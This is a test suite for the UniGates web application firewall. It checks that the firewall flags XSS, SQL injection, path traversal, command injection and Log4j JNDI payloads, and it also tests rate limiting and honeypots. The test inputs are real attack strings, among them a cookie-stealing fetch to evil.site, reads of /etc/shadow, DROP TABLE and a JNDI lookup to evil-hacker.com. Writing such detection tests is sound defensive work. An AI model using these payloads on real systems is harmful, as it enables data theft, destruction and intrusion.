import { describe, it, expect, beforeEach } from "vitest";
import {
  inspectPayload,
  inspectObject,
  sanitizeInput,
  checkRateLimit,
  validateHoneypot,
  recordThreat,
  getThreatLog,
  clearThreatLog,
  getFirewallStats,
  SecurityThreat,
} from "@/lib/security/firewall";

describe("UniGates Web Application Firewall (WAF) & IPS Test Suite", () => {
  beforeEach(() => {
    clearThreatLog();
  });

  describe("1. Anti-XSS (Cross-Site Scripting) Shield", () => {
    it("intercepts standard <script> tag injections", () => {
      const payload = "<script>alert('pwned')</script>";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.some((t) => t.category === "xss")).toBe(true);
      expect(report.threats[0].severity).toBe("critical");
    });

    it("intercepts inline event handlers (onerror, onload, onclick)", () => {
      const payload = '<img src="invalid-image" onerror="alert(document.cookie)" />';
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.some((t) => t.pattern.includes("Event Handler"))).toBe(true);
    });

    it("intercepts javascript: pseudo-protocol URIs", () => {
      const payload = "javascript:fetch('https://evil.site/steal?cookie=' + document.cookie)";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.some((t) => t.pattern.includes("JavaScript URI"))).toBe(true);
    });

    it("intercepts dynamic eval and document object tampering", () => {
      const payload = "eval('localStorage.clear()'); document.cookie";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.length).toBeGreaterThanOrEqual(1);
    });

    it("safely allows normal Arabic and English text", () => {
      const safeText = "مرحباً بكم في منصة جامعة UniGates الأكاديمية 2026";
      const report = inspectPayload(safeText);
      expect(report.isSafe).toBe(true);
      expect(report.threats.length).toBe(0);
    });
  });

  describe("2. Anti-SQL Injection (SQLi) Shield", () => {
    it("intercepts classic SQL tautology bypasses (' OR 1=1)", () => {
      const payload = "' OR 1=1 --";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.some((t) => t.category === "sqli")).toBe(true);
    });

    it("intercepts UNION SELECT database extraction attacks", () => {
      const payload = "1' UNION SELECT null, username, password FROM users --";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.some((t) => t.pattern.includes("UNION SELECT"))).toBe(true);
    });

    it("intercepts stacked destructive SQL execution (; DROP TABLE)", () => {
      const payload = "test_user'; DROP TABLE student_grades; --";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.some((t) => t.pattern.includes("Stacked SQL"))).toBe(true);
    });

    it("intercepts database schema enumeration attempts", () => {
      const payload = "SELECT * FROM information_schema.tables";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.some((t) => t.pattern.includes("Schema Enumeration"))).toBe(true);
    });
  });

  describe("3. Path Traversal & System Intrusion Shield", () => {
    it("intercepts deep directory climbing (../../)", () => {
      const payload = "../../../../etc/passwd";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.some((t) => t.category === "path_traversal")).toBe(true);
    });

    it("intercepts sensitive OS file probes (win.ini / boot.ini)", () => {
      const payload = "C:\\windows\\system32\\win.ini";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
    });

    it("intercepts null byte poisoning (%00)", () => {
      const payload = "document.pdf%00.exe";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.some((t) => t.pattern.includes("Null Byte"))).toBe(true);
    });
  });

  describe("4. Command Injection & Remote Code Execution Blocker", () => {
    it("intercepts shell command execution chaining", () => {
      const payload = "input_data; cat /etc/shadow";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.some((t) => t.category === "command_injection")).toBe(true);
    });

    it("intercepts JNDI Log4j injection attempts", () => {
      const payload = "${jndi:ldap://evil-hacker.com/exploit}";
      const report = inspectPayload(payload);
      expect(report.isSafe).toBe(false);
      expect(report.threats.some((t) => t.pattern.includes("JNDI"))).toBe(true);
    });
  });

  describe("5. Recursive Deep Object & Form Inspection", () => {
    it("detects and sanitizes threats nested deeply inside JSON bodies", () => {
      const complexForm = {
        title: "Normal Title",
        metadata: {
          author: "Lecturer",
          comment: "<script>stealData()</script>",
          nestedTags: ["clean", "1' OR '1'='1"],
        },
      };

      const result = inspectObject(complexForm);
      expect(result.isSafe).toBe(false);
      expect(result.threats.length).toBeGreaterThanOrEqual(2);
      expect(result.sanitizedData.metadata.comment).not.toContain("<script>");
    });
  });

  describe("6. Anti-Brute-Force & Rate Limiting Engine", () => {
    it("allows requests under the rate threshold and blocks when threshold is exceeded", () => {
      const action = "test_login_action";
      const customConfig = { maxAttempts: 3, windowMs: 10_000 };

      // 1st attempt
      expect(checkRateLimit(action, "ip_user_1", customConfig).allowed).toBe(true);
      // 2nd attempt
      expect(checkRateLimit(action, "ip_user_1", customConfig).allowed).toBe(true);
      // 3rd attempt
      expect(checkRateLimit(action, "ip_user_1", customConfig).allowed).toBe(true);
      // 4th attempt -> Should be BLOCKED!
      const blockedRes = checkRateLimit(action, "ip_user_1", customConfig);
      expect(blockedRes.allowed).toBe(false);
      expect(blockedRes.remaining).toBe(0);
      expect(blockedRes.resetTimeMs).toBeGreaterThan(0);
    });
  });

  describe("7. Honeypot Bot Trap Validation", () => {
    it("accepts authentic human form submission with empty honeypot", () => {
      expect(validateHoneypot("")).toBe(true);
      expect(validateHoneypot(null)).toBe(true);
      expect(validateHoneypot(undefined)).toBe(true);
    });

    it("flags automated bot submission when honeypot contains values", () => {
      expect(validateHoneypot("bot_inserted_value")).toBe(false);
      expect(validateHoneypot("http://spam.org")).toBe(false);
    });
  });

  describe("8. Health Scoring & Audit Log Metrics", () => {
    it("maintains 100% health score when no threats exist", () => {
      const stats = getFirewallStats();
      expect(stats.securityHealthScore).toBe(100);
      expect(stats.totalIntercepted).toBe(0);
    });

    it("accurately increments counters when threats are recorded", () => {
      const mockThreat: SecurityThreat = {
        id: "t_1",
        category: "xss",
        severity: "critical",
        pattern: "Script Tag Injection",
        sanitizedEvidence: "[TAG]",
        timestamp: new Date().toISOString(),
        blocked: true,
      };

      recordThreat(mockThreat);
      const stats = getFirewallStats();
      expect(stats.totalIntercepted).toBe(1);
      expect(stats.xssBlocked).toBe(1);
      expect(stats.criticalThreats).toBe(1);
      expect(stats.securityHealthScore).toBeLessThan(100);
    });
  });
});
